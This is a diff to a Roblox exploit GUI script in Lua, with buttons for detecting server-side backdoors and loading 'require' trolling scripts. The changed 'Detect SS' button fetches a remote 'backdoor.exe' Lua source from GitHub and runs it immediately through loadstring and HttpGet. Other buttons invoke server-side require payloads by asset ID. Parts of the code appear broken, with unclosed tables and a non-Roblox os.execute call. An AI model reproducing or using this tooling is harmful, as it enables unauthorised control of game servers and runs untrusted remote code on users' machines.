@@ -122,7 +122,7 @@ r:Label("Scan Game",{
 })
 
 r:Button("Detect SS",function()
-    print("CONGRATS")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua",true))()
 end)
 
 r:Label("Require Скрипты",{
@@ -131,10 +131,18 @@ r:Label("Require Скрипты",{
     BgColor = Color3.fromRGB(69,69,69);
 })
 
-r:Button("Adrian Trolling GUI",function()
+r:Button("Adrian Latest GUI",function()
     os.execute('require(8801189907):adrian("PUT YOUR USERNAME")')
     game.StarterGui:SetCore("SendNotification",{
-    Title = "ServerSide";
+    Title = "Master SS";
     Text = "The require сценарий has been copied to clipboard";
+    Duration = 10;
+end)
+        
+r:Button("Coming Soon",function()
+    os.execute('None')
+    game.StarterGui:SetCore("SendNotification",{
+    Title = "Master SS";
+    Text = "More require scripts coming soon!";
     Duration = 10;
 end)
